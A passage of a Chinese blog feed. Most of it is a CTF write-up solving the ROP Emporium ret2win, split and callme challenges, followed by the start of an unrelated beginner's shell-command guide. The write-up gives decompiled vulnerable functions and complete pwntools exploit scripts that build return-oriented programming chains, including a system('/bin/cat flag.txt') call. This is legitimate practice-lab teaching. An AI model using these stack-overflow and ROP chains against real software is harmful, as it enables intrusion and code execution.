<h3 id="x86-64"><a href="#x86-64" class="headerlink" title="x86_64"></a>x86_64</h3><h4 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h4><p>使用 checksec 检查开启的安全保护：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/ubuntu/Datas/rop-emporium/ret2win/ret2win&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>发现开启了 <code>NX</code> 和 <code>Partial RELRO</code></p>
<details class="note success"><summary><p><code>NX</code>、<code>Partial RELRO</code> 等是什么？</p>
</summary>
<ul>
<li><code>NX</code>：不可执行栈，即栈上的数据不可执行，防止栈溢出往栈上注入 shellcode 执行</li>
<li><code>RELRO</code>：全称 <code>Relocation Read-Only</code>，即只读重定位，防止 GOT 覆盖攻击<ul>
<li><code>Full RELRO</code>：所有重定位表都是只读的，包括 PLT 和 GOT</li>
<li><code>Partial RELRO</code>：只有 PLT 是只读的，GOT 是可写的</li>
<li><code>No RELRO</code>：所有重定位表都是可写的</li>
</ul>
</li>
</ul>

</details>

<p>再使用 Ghidra 反编译分析源码，容易找到存在栈溢出的函数 <code>pwnme()</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">pwnme</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined local_28 [<span class="number">32</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">memset</span>(local_28,<span class="number">0</span>,<span class="number">0x20</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">      <span class="string">&quot;For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffe r!&quot;</span></span><br><span class="line">      );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What could possibly go wrong?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">      <span class="string">&quot;You there, may I have your input please? And don\&#x27;t worry about null bytes, we\&#x27;re using read ()!\n&quot;</span></span><br><span class="line">      );</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>,local_28,<span class="number">56</span>);  <span class="comment">// 存在栈溢出</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在程序中发现可以直接获取到 <code>flag</code> 的函数 <code>ret2win</code>：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20220307155836064.png" alt="image-20220307155836064"></p>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>没有Canary，直接通过栈溢出修改返回地址，让程序跳转执行 <code>ret2win</code> 函数</li>
<li>得到 flag</li>
</ol>
<p>当程序执行到 <code>pwnme</code> 函数的 <code>leave; ret</code> 时，可以看到此时栈的数据情况如下：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Pasted%20image%2020220818102948.png" alt="Pasted image 20220818102948"></p>
<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;info&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ret2win&#x27;</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line">io = elf.process()</span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    cyclic(<span class="number">32</span>),  <span class="comment"># 填充缓冲区</span></span><br><span class="line">    cyclic(<span class="number">8</span>),   <span class="comment"># fake rbp</span></span><br><span class="line">    p64(rop.ret.address), <span class="comment"># 加一个ret gadget</span></span><br><span class="line">    p64(elf.sym.ret2win)  <span class="comment"># ret address</span></span><br><span class="line">])</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<details class="note success"><summary><p>为何要加一个 <code>ret gadget</code> ?</p>
</summary>
<p>　　在 <code>Ubuntu 18</code> 以上版本下执行 system 系统调用时需要栈对齐 <code>0x10</code>，不对齐时会导致程序崩溃退出，例如 这里的 system 函数；遇到无法正常利用的情况可以通过添加 <code>ret gadget</code> 让栈对齐。</p>
<p>不加 ret gadget 时会出现下面的 Segmentation fault:</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/Pasted%20image%2020220818103522.png" alt="Pasted image 20220818103522"></p>
<p><code>movaps xmmword ptr [rsp + 0x50], xmm0</code> 这个指令会检查栈是否16字节对齐，对齐时 RSP 值末尾需要是 0 </p>

</details>


<div class="note info"><ul>
<li>符号表中存在目标函数名称时，在 <code>pwntools</code> 中可以直接通过 <code>elf.sym.函数名</code> 获取函数地址</li>
</ul>
</div>

<p>得到 flag：<code>ROPE&#123;a_placeholder_32byte_flag!&#125;</code></p>
<h3 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h3><h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>32 位程序的缓冲区大小略有不同：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">pwnme</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined local_2c [<span class="number">40</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">memset</span>(local_2c,<span class="number">0</span>,<span class="number">0x20</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">      <span class="string">&quot;For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffe r!&quot;</span></span><br><span class="line">      );</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What could possibly go wrong?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(</span><br><span class="line">      <span class="string">&quot;You there, may I have your input please? And don\&#x27;t worry about null bytes, we\&#x27;re using read ()!\n&quot;</span></span><br><span class="line">      );</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>,local_2c,<span class="number">56</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><p>思路同上</p>
<h4 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h4><p>payload 稍加修改：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = flat([</span><br><span class="line">    cyclic(<span class="number">40</span>),           <span class="comment"># buffer</span></span><br><span class="line">    cyclic(<span class="number">4</span>),            <span class="comment"># fake esp</span></span><br><span class="line">    p32(elf.sym.ret2win)  <span class="comment"># return address</span></span><br><span class="line">])</span><br></pre></td></tr></table></figure>

<p>得到 flag：<code>ROPE&#123;a_placeholder_32byte_flag!&#125;</code></p>
<h2 id="Challenge2-split"><a href="#Challenge2-split" class="headerlink" title="Challenge2 split"></a>Challenge2 split</h2><p>题目说明及文件: <a href="https://ropemporium.com/challenge/split.html">https://ropemporium.com/challenge/split.html</a></p>
<h3 id="x86-64-1"><a href="#x86-64-1" class="headerlink" title="x86_64"></a>x86_64</h3><h4 id="程序分析-1"><a href="#程序分析-1" class="headerlink" title="程序分析"></a>程序分析</h4><p>检查开启的安全保护：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/ubuntu/Datas/rop-emporium/split/split&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<p>发现开启了 NX 和 Partial RELRO</p>
<p>再反编译分析源码，同样容易找到存在栈溢出的函数 pwnme()：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">pwnme</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined local_28 [<span class="number">32</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">memset</span>(local_28,<span class="number">0</span>,<span class="number">0x20</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Contriving a reason to ask user for data...&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>,local_28,<span class="number">0x60</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这一次没有了可以直接获取 flag 的函数，但是在 <code>.got.plt</code> 表中发现有 system 函数：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20220307165702896.png" alt="image-20220307165702896" style="zoom:50%;" />

<details class="note success"><summary><p><code>.got.plt</code> 是什么?</p>
</summary>
<p><a href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html">.got.plt</a>: This is the GOT for the PLT. It contains the target addresses (after they have been looked up) or an address back in the <code>.plt</code> to trigger the lookup. Classically, this data was part of the <code>.got</code> section.</p>
<ul>
<li>相当于是 <code>.plt</code> 的 GOT 全局偏移表<ul>
<li>当目标函数查找过时，其中存储有函数的具体地址</li>
<li>当目标函数并未查找过时，其中存储有跳转到 <code>.plt</code> 的代码 (未开启 Full RELRO 时)</li>
</ul>
</li>
<li>关于 GOT、PLT 具体的内容可学习 CSAPP 第7章 – 链接</li>
<li>这里借用 <code>.got.plt</code> 表来查看当前程序调用了哪些 libc 函数，我们可以直接通过 plt 表来获取函数的地址用来构造 ROP</li>
</ul>

</details>

<p>另外在 data 段中发现有用的字符串：<code>/bin/cat flag.txt</code> </p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20220307164132689.png" alt="image-20220307164132689" style="zoom:50%;" />

<p>考虑直接调用 <code>system(&quot;/bin/cat flag.txt&quot;)</code>，x86_64 中函数的第一个参数通过 rdi 寄存器传递</p>
<p>找 gadget，有 <code>pop rdi; ret</code>：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20220307170816647.png" alt="image-20220307170816647" style="zoom:50%;" />

<details class="note info"><summary><p>GadgetFinder 的使用</p>
</summary>
<ol>
<li><a href="https://github.com/sashs/Ropper">ropper</a><ul>
<li>安装：<code>pip3 install ropper</code></li>
<li>使用：<code>ropper -f &lt;program&gt; --search=&quot;pop rdi&quot;</code></li>
</ul>
</li>
<li><a href="https://github.com/JonathanSalwan/ROPgadget">ROPgadget</a><ul>
<li>安装：<code>pip3 install ROPgadget</code></li>
<li>使用：<code>ROPgadget --binary &lt;program&gt; | grep &quot;pop rdi&quot; </code></li>
</ul>
</li>
</ol>

</details>

<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><p>没有 Canary，直接通过栈溢出修改返回地址，可构造ROP链进行调用</p>
<ol>
<li>调用 <code>pop rdi gadget</code>，将 <code>rdi</code> 指向 <code>/bin/cat flag.txt</code> </li>
<li>调用 <code>system</code> 函数，执行 <code>system(&quot;/bin/cat flag.txt&quot;)</code> </li>
<li>得到 flag</li>
</ol>
<h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line">io = elf.process()</span><br><span class="line"></span><br><span class="line">POP_RDI_RET = <span class="number">0x00000000004007c3</span></span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    cyclic(<span class="number">32</span>),                 <span class="comment"># buffer</span></span><br><span class="line">    cyclic(<span class="number">8</span>),                  <span class="comment"># fake rbp</span></span><br><span class="line">    p64(rop.ret.address),       <span class="comment"># ret gadget</span></span><br><span class="line">    p64(POP_RDI_RET),           <span class="comment"># 参数1</span></span><br><span class="line">    p64(elf.sym.usefulString),  <span class="comment"># &quot;/bin/cat flag.txt&quot;</span></span><br><span class="line">    p64(elf.plt.system)         <span class="comment"># system(&quot;/bin/cat flag.txt&quot;)</span></span><br><span class="line">])</span><br><span class="line">io.recv()</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>得到 flag：<code>ROPE&#123;a_placeholder_32byte_flag!&#125;</code></p>
<h3 id="x86-1"><a href="#x86-1" class="headerlink" title="x86"></a>x86</h3><h4 id="程序分析-2"><a href="#程序分析-2" class="headerlink" title="程序分析"></a>程序分析</h4><p>32 位程序的缓冲区大小略有不同：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">pwnme</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined local_2c [<span class="number">40</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">memset</span>(local_2c,<span class="number">0</span>,<span class="number">0x20</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Contriving a reason to ask user for data...&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>,local_2c,<span class="number">0x60</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><p>思路同上，不过 x86 函数调用中，参数在栈上传递：<a href="https://ex7l0it.github.io/2022/08/13/stackoverflow/#32bit">x86 函数调用栈</a></p>
<h4 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h4><p>payload 稍加修改：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = flat([</span><br><span class="line">    cyclic(<span class="number">40</span>),                <span class="comment"># buffer</span></span><br><span class="line">    cyclic(<span class="number">4</span>),                 <span class="comment"># fake ebp</span></span><br><span class="line">    p32(elf.plt.system),       <span class="comment"># return address</span></span><br><span class="line">    cyclic(<span class="number">4</span>),                 <span class="comment"># next return address</span></span><br><span class="line">    p32(elf.sym.usefulString)  <span class="comment"># 参数1</span></span><br><span class="line">])</span><br></pre></td></tr></table></figure>

<p>得到 flag：<code>ROPE&#123;a_placeholder_32byte_flag!&#125;</code></p>
<h2 id="Challenge3-callme"><a href="#Challenge3-callme" class="headerlink" title="Challenge3 callme"></a>Challenge3 callme</h2><p>题目说明及文件: <a href="https://ropemporium.com/challenge/callme.html">https://ropemporium.com/challenge/callme.html</a></p>
<h3 id="x86-64-2"><a href="#x86-64-2" class="headerlink" title="x86_64"></a>x86_64</h3><h4 id="程序分析-3"><a href="#程序分析-3" class="headerlink" title="程序分析"></a>程序分析</h4><p>检查开启的安全保护：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/ubuntu/Datas/rop-emporium/callme/callme&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    RUNPATH:  b&#x27;.&#x27;</span><br></pre></td></tr></table></figure>

<p>发现开启了 NX 和 Partial RELRO</p>
<p>再反编译源码，同样容易找到存在栈溢出的函数 pwnme()：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">pwnme</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined local_28 [<span class="number">32</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">memset</span>(local_28,<span class="number">0</span>,<span class="number">0x20</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hope you read the instructions...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>,local_28,<span class="number">0x200</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里有 usefulFunction 函数：</p>
<p><img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20220307174011602.png" alt="image-20220307174011602"></p>
<p>根据题目所描述，需要依次调用 <code>callme_one(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)</code> 、<code>callme_two(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d)</code>、<code>callme_three(0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d) </code>函数，然后即可得到 flag</p>
<p>x86_64 的函数调用，参数1、参数2、参数3分别通过 RDI、RSI 和 RDX 寄存器传递</p>
<p>程序中可以找到 <code>usefulGadgets</code>，刚好可以用来指定这三个参数：</p>
<img src="https://raw.githubusercontent.com/ex7l0it/ImageHosting/master/Picture/image-20220307174539471.png" alt="image-20220307174539471" style="zoom:50%;" />

<h4 id="思路-4"><a href="#思路-4" class="headerlink" title="思路"></a>思路</h4><p>没有 Canary，直接通过栈溢出修改返回地址，可构造ROP链进行调用</p>
<ol>
<li>先调用 <code>usefulGadgets</code>，将 rdi、rsi 和 rdx 分别赋值 <code>0xdeadbeefdeadbeef</code>、<code>0xcafebabecafebabe</code> 和 <code>0xd00df00dd00df00d</code></li>
<li>再调用 <code>callme_one</code> 函数</li>
<li>再调用 <code>usefulGadgets</code> 然后调用 <code>callme_two</code> </li>
<li>再调用 <code>usefulGadgets</code> 然后调用 <code>callme_three</code> </li>
<li>得到 flag</li>
</ol>
<h4 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.update(arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./callme&#x27;</span>)</span><br><span class="line">io = elf.process()</span><br><span class="line"></span><br><span class="line">payload = flat([</span><br><span class="line">    cyclic(<span class="number">32</span>),</span><br><span class="line">    cyclic(<span class="number">8</span>),</span><br><span class="line">    p64(elf.sym.usefulGadgets), <span class="comment"># pop rdi; pop rsi; pop rdx;</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),    <span class="comment"># 参数1</span></span><br><span class="line">    p64(<span class="number">0xcafebabecafebabe</span>),    <span class="comment"># 参数2</span></span><br><span class="line">    p64(<span class="number">0xd00df00dd00df00d</span>),    <span class="comment"># 参数3</span></span><br><span class="line">    p64(elf.sym.callme_one),</span><br><span class="line">    p64(elf.sym.usefulGadgets),</span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),</span><br><span class="line">    p64(<span class="number">0xcafebabecafebabe</span>),</span><br><span class="line">    p64(<span class="number">0xd00df00dd00df00d</span>),</span><br><span class="line">    p64(elf.sym.callme_two),</span><br><span class="line">    p64(elf.sym.usefulGadgets),</span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),</span><br><span class="line">    p64(<span class="number">0xcafebabecafebabe</span>),</span><br><span class="line">    p64(<span class="number">0xd00df00dd00df00d</span>),</span><br><span class="line">    p64(elf.sym.callme_three)</span><br><span class="line">])</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>得到 flag：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">Thank you!</span><br><span class="line">[DEBUG] Received 0x1e bytes:</span><br><span class="line">    b&#x27;callme_one() called correctly\n&#x27;</span><br><span class="line">callme_one() called correctly</span><br><span class="line">[*] Process &#x27;/home/ubuntu/Datas/rop-emporium/callme/callme&#x27; stopped with exit code 0 (pid 10210)</span><br><span class="line">[DEBUG] Received 0x3f bytes:</span><br><span class="line">    b&#x27;callme_two() called correctly\n&#x27;</span><br><span class="line">    b&#x27;ROPE&#123;a_placeholder_32byte_flag!&#125;\n&#x27;</span><br><span class="line">callme_two() called correctly</span><br><span class="line">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br></pre></td></tr></table></figure>

<h3 id="x86-2"><a href="#x86-2" class="headerlink" title="x86"></a>x86</h3><h4 id="程序分析-4"><a href="#程序分析-4" class="headerlink" title="程序分析"></a>程序分析</h4><p>32 位程序的缓冲区大小略有不同：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">pwnme</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  undefined local_2c [<span class="number">40</span>];</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">memset</span>(local_2c,<span class="number">0</span>,<span class="number">0x20</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Hope you read the instructions...\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>,local_2c,<span class="number">0x200</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="思路-5"><a href="#思路-5" class="headerlink" title="思路"></a>思路</h4><p>没有 Canary，直接通过栈溢出修改返回地址，可构造ROP链进行调用，稍不同于64位，执行完一个函数后需要先跳转回漏洞函数，再次触发栈溢出漏洞</p>
<ol>
<li>调用 <code>callme_one</code> 函数，然后将程序再次跳回 <code>main</code>，重新触发栈溢出漏洞</li>
<li>调用 <code>callme_two</code> 函数，然后将程序再次跳回 <code>main</code>，重新触发栈溢出漏洞</li>
<li>调用 <code>callme_three</code> 函数</li>
<li>得到 flag</li>
</ol>
<h4 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h4><p>payload 改动较大：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = flat([</span><br><span class="line">    cyclic(<span class="number">40</span>),</span><br><span class="line">    cyclic(<span class="number">4</span>),</span><br><span class="line">    p32(elf.sym.callme_one), <span class="comment"># return address</span></span><br><span class="line">    p32(elf.sym.pwnme),      <span class="comment"># next address</span></span><br><span class="line">    p32(<span class="number">0xdeadbeef</span>),         <span class="comment"># 参数1</span></span><br><span class="line">    p32(<span class="number">0xcafebabe</span>),         <span class="comment"># 参数2</span></span><br><span class="line">    p32(<span class="number">0xd00df00d</span>),         <span class="comment"># 参数3</span></span><br><span class="line">])</span><br><span class="line">payload2 = flat([</span><br><span class="line">    cyclic(<span class="number">40</span>),</span><br><span class="line">    cyclic(<span class="number">4</span>),</span><br><span class="line">    p32(elf.sym.callme_two),</span><br><span class="line">    p32(elf.sym.pwnme),</span><br><span class="line">    p32(<span class="number">0xdeadbeef</span>),</span><br><span class="line">    p32(<span class="number">0xcafebabe</span>),</span><br><span class="line">    p32(<span class="number">0xd00df00d</span>),</span><br><span class="line">])</span><br><span class="line">payload3 = flat([</span><br><span class="line">    cyclic(<span class="number">40</span>),</span><br><span class="line">    cyclic(<span class="number">4</span>),</span><br><span class="line">    p32(elf.sym.callme_three),</span><br><span class="line">    p32(elf.sym.exit),</span><br><span class="line">    p32(<span class="number">0xdeadbeef</span>),</span><br><span class="line">    p32(<span class="number">0xcafebabe</span>),</span><br><span class="line">    p32(<span class="number">0xd00df00d</span>),</span><br><span class="line">])</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(payload3)</span><br></pre></td></tr></table></figure>

<p>得到 flag：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[DEBUG] Received 0x6f bytes:</span><br><span class="line">    b&#x27;callme_two() called correctly\n&#x27;</span><br><span class="line">    b&#x27;Hope you read the instructions...\n&#x27;</span><br><span class="line">    b&#x27;\n&#x27;</span><br><span class="line">    b&#x27;&gt; Thank you!\n&#x27;</span><br><span class="line">    b&#x27;ROPE&#123;a_placeholder_32byte_flag!&#125;\n&#x27;</span><br><span class="line">callme_two() called correctly</span><br><span class="line">Hope you read the instructions...</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">Thank you!</span></span><br><span class="line">ROPE&#123;a_placeholder_32byte_flag!&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>writeup</tag>
        <tag>rop</tag>
      </tags>
  </entry>
  <entry>
    <title>基础知识 - shell 💻</title>
    <url>/2023/09/20/shell/</url>
    <content><![CDATA[<h1 id="基础知识-Shell"><a href="#基础知识-Shell" class="headerlink" title="基础知识 - Shell"></a>基础知识 - Shell</h1><ul>
<li>版本：2023秋季学期</li>
</ul>
<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><ul>
<li>🤔 什么是 Shell ?<ul>
<li>简单来说，Shell 是一个程序，能够从键盘接收命令并转给系统去执行。</li>
<li>CLI(Command-line interface) vs GUI(Graphical user interface)<ul>
<li>CLI: 命令行界面</li>
<li>GUI: 图形界面</li>
</ul>
</li>
<li>在大多数 Linux 发行版中，Shell 默认是 <code>Bash</code>(Bourne Again Shell), 除此之外还有很多种 Shell, 如 <code>zsh</code>, <code>ksh</code>, <code>tcsh</code> 等等；Windows 上的 Shell 有 <code>PowerShell</code>, <code>cmd.exe</code> 等等。</li>
</ul>
</li>
<li>📙 <a href="https://stackoverflow.com/questions/56658043/shell-vs-terminal-vs-command-line-vs-bash">shell vs terminal vs command line vs Bash?</a></li>
</ul>
<h2 id="shell-的基本命令"><a href="#shell-的基本命令" class="headerlink" title="shell 的基本命令"></a>shell 的基本命令</h2><table>
<thead>
<tr>
<th>命令</th>
<th>作用</th>
</tr>
</thead>
<tbody><tr>
<td><code>ls</code></td>
<td>列出当前目录内容</td>
</tr>
<tr>
<td><code>cd</code></td>
<td>切换工作目录</td>
</tr>
<tr>
<td><code>pwd</code></td>
<td>打印当前工作目录</td>
</tr>
<tr>
<td><code>touch</code></td>
<td>创建文件</td>
</tr>
<tr>
<td><code>mkdir</code> &#x2F;  <code>rmdir</code></td>
<td>创建 &#x2F; 删除目录</td>
</tr>
<tr>
<td><code>mv</code></td>
<td>移动</td>
</tr>
<tr>
<td><code>cp</code></td>
<td>复制</td>
</tr>
<tr>
<td><code>rm</code></td>
<td>删除</td>
</tr>
<tr>
<td><code>echo</code></td>
<td>输出字符串</td>
</tr>
<tr>
<td><code>man</code></td>
<td>查看帮助文档</td>
</tr>
<tr>
<td><code>date</code></td>
<td>打印当前日期时间</td>
</tr>
<tr>
<td><code>which</code></td>
<td>从环境变量(<code>$PATH</code>)中寻找目标文件</td>
</tr>
<tr>
<td><code>cat</code></td>
<td>查看文件内容</td>
</tr>
<tr>
<td><code>head</code></td>
<td>查看文件头部内容</td>
</tr>
<tr>
<td><code>tail</code></td>
<td>查看文件尾部内容</td>
</tr>
<tr>
<td><code>more</code></td>
<td>分页显示文件内容</td>
</tr>
<tr>
<td><code>less</code></td>
<td>也是分页显示，比 more 好使，能灵活翻页</td>
</tr>
<tr>
<td><code>clear</code></td>
<td>清屏</td>
</tr>
<tr>
<td><code>find</code></td>
<td>寻找文件</td>
</tr>
<tr>
<td><code>grep</code></td>
<td>筛选出文件中匹配的行</td>
</tr>
<tr>
<td><code>chown</code></td>
<td>修改所属用户与组</td>
</tr>
<tr>
<td><code>chmod</code></td>
<td>修改用户权限</td>
</tr>
<tr>
<td>…</td>
<td></td>
</tr>
</tbody></table>
<p>还有很多基本命令，就不一一解释了，自行使用 man 查询即可</p>
<ul>
<li>除了 man 之外，用 <a href="https://github.com/tldr-pages/tldr">tldr</a> （Too Long Didn’t Read）可能是一个方便一点的选择（也还行吧）<ul>
<li>安装: <code>pip3 install tldr</code></li>
<li>更新数据库: <code>tldr -u</code></li>
</ul>
</li>
</ul>
